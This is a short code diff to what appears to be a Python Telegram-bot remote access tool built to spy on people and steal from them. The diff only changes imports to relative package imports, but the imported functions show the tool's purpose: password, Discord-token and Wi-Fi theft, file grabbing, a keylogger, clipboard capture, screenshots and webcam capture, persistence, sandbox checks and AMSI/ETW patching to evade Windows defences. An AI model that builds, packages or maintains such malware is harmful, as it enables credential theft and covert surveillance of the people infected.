@@ -9,11 +9,11 @@ import random
 import telebot
 from telebot import types
 
-from config import TOKEN, ADMIN_ID, CREATE_NO_WINDOW
-from state import state
-from anti import hide_console, sandbox_check, patch_amsi_etw
-from stealers import steal_all_passwords, steal_discord_tokens, steal_wifi, grab_interesting_files
-from system import (
+from .config import TOKEN, ADMIN_ID, CREATE_NO_WINDOW
+from .state import state
+from .anti import hide_console, sandbox_check, patch_amsi_etw
+from .stealers import steal_all_passwords, steal_discord_tokens, steal_wifi, grab_interesting_files
+from .system import (
     start_keylogger, stop_keylogger, start_clip, stop_clip,
     persist, self_destruct, take_screenshot, take_webcam, show_msg,
     clipboard_worker
